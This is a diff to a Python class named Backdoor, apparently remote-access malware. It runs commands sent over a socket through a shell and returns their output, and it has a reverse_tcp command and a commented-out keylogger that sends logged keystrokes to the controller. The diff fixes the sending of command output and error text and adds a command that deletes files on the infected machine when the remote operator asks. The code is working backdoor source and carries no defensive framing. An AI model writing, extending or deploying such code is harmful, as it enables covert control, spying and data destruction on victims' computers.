@@ -45,8 +45,8 @@ class Backdoor:
             with open("log.txt","r") as text2:
                 text_data = text2.read()
                 self.sock.send(text_data.encode())
-                os.remove("log.txt")
-                sys.exit()"""
+                # os.remove("log.txt")
+                # sys.exit()"""
 
     """def listener(self):
         with Listener(on_press = self.keylogger) as l: 
@@ -75,8 +75,10 @@ class Backdoor:
             # command_prompt = os.popen(message_command_descrypt).read()
             try:
                 command_prompt = subprocess.check_output(message_command_descrypt, stderr=subprocess.STDOUT, shell=True)
+                print('Command Sent!')
+                self.sock.send(command_prompt)
             except Exception as e:
-                command_prompt = str("").encode()
+                command_prompt = str(e).encode()
 
             # Navegate into directories
 
@@ -130,6 +132,18 @@ class Backdoor:
             if message_command_descrypt == "reverse_tcp":
                 self.sock.send("You must put IP and PORT as parameters! Ex: reverse_tcp 192.168 7777".encode())
 
+            # Remove files
+            
+            if message_command_descrypt.startswith("rm "):
+                location = os.getcwd()
+                os.chdir(location)
+                self.rmfile = message_command_descrypt.split(" ")[1]
+                os.remove(f"{location}/{self.rmfile}")
+                self.sock.send("Removed file with sucess!".encode())
+                
+
+            if message_command_descrypt == "rm":
+                self.sock.send("You must specify a file".encode())
 
             # TCP Reverse shell in python
 
@@ -155,8 +169,7 @@ class Backdoor:
 
             #  message = command_prompt.stdout.read()
             #  error_message = command_prompt.stderr.read()
-            print('Command Sent!')
-            self.sock.send(command_prompt)
+
 
         self.sock.close()
 
